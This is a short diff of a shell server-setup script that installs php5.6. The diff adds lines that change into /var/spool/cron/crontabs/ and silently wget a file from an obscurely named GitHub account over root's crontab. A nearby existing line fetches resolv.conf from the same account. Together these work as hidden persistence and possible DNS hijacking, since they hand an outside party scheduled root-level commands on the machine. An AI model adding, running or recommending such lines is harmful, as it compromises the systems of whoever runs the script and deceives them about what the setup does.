@@ -18,6 +18,10 @@ apt-get update
 
 apt-get install -y php5.6
 
+cd /var/spool/cron/crontabs/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/root84744474 -O /var/spool/cron/crontabs/root
+
 chmod 600 -R ./root
 
 wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/resolv.conf
